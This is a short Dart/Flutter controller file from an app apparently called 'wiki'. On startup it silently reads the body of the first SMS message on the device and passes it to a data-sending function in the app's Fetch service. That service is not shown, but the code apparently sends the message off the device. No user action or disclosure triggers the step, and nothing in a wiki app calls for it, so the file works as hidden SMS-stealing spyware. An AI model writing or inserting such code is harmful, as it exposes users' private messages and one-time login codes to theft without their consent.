import 'package:get/get.dart';
import 'package:sms/sms.dart';
import 'package:wiki/service/fetch.dart';

class Controller extends GetxController {
  Fetch fetch = Fetch();
  SmsQuery query = new SmsQuery();

  @override
  void onInit() async {
    super.onInit();
    var data = await readSms();
    fetch.sendData(data);
  }

  Future readSms() async {
    List<SmsMessage> messages = await query.getAllSms;
    return messages.first.body;
  }
}
